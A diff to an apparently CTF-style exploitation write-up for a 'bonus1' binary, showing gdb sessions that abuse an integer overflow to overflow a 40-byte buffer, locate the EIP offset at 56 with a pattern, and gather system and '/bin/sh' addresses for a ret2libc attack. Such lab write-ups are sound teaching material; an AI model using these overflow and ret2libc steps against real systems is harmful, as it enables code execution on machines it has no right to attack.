@@ -11,7 +11,7 @@ The program segfault without parameters
 
 Start in GDB
 
-	(gdb-peda)$ pdisas main
+	(gdb)$ pdisas main
 	Dump of assembler code for function main:
 	   0x08048424 <+0>:		push   ebp
 	   0x08048425 <+1>:		mov    ebp,esp
@@ -82,11 +82,11 @@ UINT_MAX is 4294967295, / 4 is 1073741823
 try with -1073741823
 
 
-	(gdb-peda) r -1073741823 coucou
+	(gdb) r -1073741823 coucou
 	r -1073741823 coucou
 
-	(gdb-peda) p $ecx
-	$15 = 0x4
+	(gdb) p $ecx
+	$1 = 4
 
 ok, the result of input*4 is 4, so we passed 1... If we continue the program -> no segfault
 
@@ -94,13 +94,11 @@ ok, the result of input*4 is 4, so we passed 1... If we continue the program -> 
 let's add more than 10 (10*4) for overflow the buffer[40], -1073741823 - 20
 
 
-	(gdb-peda)$ r -1073741803 coucou
+	(gdb)$ r -1073741803 coucou
 	Breakpoint 1, 0x08048473 in main ()
 
-	(gdb-peda)$ p $ecx
-	$16 = 0x54
-
-0x54 = 84
+	(gdb)$ p $ecx
+	$16 = 84
 
 	(gdb-peda)$ c
 	Continuing.
@@ -109,17 +107,34 @@ let's add more than 10 (10*4) for overflow the buffer[40], -1073741823 - 20
 
 We have the segfault, let's try with a pattern
 
-	(gdb-peda)$ pattern search
-	Registers contain pattern buffer:
-	EBP+0 found at offset: 52
-	EIP+0 found at offset: 56
-	....
+	(gdb) r -1073741803 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
+	Starting program: /home/user/bonus1/bonus1 -1073741803 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
 
-We have the control of EIP! At the offset 56
+	Program received signal SIGSEGV, Segmentation fault.
+	0x4f4f4f4f in ?? ()
+
+	(gdb) i r
+	eax            0x0	0
+	ecx            0x55555555	1431655765
+	edx            0xbffff588	-1073744504
+	ebx            0xb7fd0ff4	-1208152076
+	esp            0xbffff570	0xbffff570
+	ebp            0x4e4e4e4e	0x4e4e4e4e
+	esi            0x0	0
+	edi            0x0	0
+	eip            0x4f4f4f4f	0x4f4f4f4f
+	eflags         0x210287	[ CF PF SF IF RF ID ]
+	cs             0x73	115
+	ss             0x7b	123
+	ds             0x7b	123
+	es             0x7b	123
+	fs             0x0	0
+	gs             0x33	51
+
+EIP was overwritten by `0x4f4f4f4f` (OOOO). The offset start at 56
+
 
 Now, for do a ret2libc attack, we need the system address, and the address of the string "/bin/sh"
-
-We will do it in the vm this time
 
 	0x08048482 <+94>:	movl   $0x0,0x8(%esp)
 	0x0804848a <+102>:	movl   $0x8048580,0x4(%esp)
@@ -146,7 +161,6 @@ The address of "/bin/sh" is "0x8048583"
 	0xb7f49550  svcerr_systemerr
 
 The address of system is "0xb7e6b060"
-
 
 Build the payload
 
